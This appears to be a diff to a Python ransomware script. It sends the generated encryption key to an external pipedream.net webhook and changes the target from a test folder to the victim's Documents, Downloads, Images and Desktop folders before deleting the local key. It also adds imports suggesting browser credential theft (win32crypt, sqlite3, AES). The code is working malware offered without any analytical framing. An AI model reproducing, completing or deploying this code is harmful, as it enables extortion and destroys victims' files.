@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet
 from tkinter import *
 import webbrowser
+from pathlib import Path
 import os
 import glob
 import random
@@ -9,6 +10,12 @@ import requests
 import urllib.request
 import tempfile
 import shutil
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+from datetime import datetime, timedelta
 
 def main():
     new = 1
@@ -82,7 +89,7 @@ def write_key():
     with open("key.key", "rb") as key_file:
         key = key_file.read()
 
-    r = requests.post("https://enoec5erdnbzawd.m.pipedream.net", data={"key": key}, headers={'Content - Type': 'application / json'})
+    r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": key}, headers={'Content - Type': 'application / json'})
 
 def load_key():
     """
@@ -109,8 +116,17 @@ def start():
         shutil.move(path + "\\" + signature, tmp + "\\" + signature)
         write_key()
         key = load_key()
-        dir = "fichiers"
-        encrypt(dir, key)
+        documents = str(os.path.join(Path.home(), "Documents"))
+        downloads = str(os.path.join(Path.home(), "Downloads"))
+        images = str(os.path.join(Path.home(), "Images"))
+        desktop = str(os.path.join(Path.home(), "Desktop"))
+        dirs = []
+        dirs.append(documents)
+        dirs.append(downloads)
+        dirs.append(images)
+        dirs.append(desktop)
+        for dir in dirs:
+            encrypt(dir, key)
         kill_key()
         main()
 
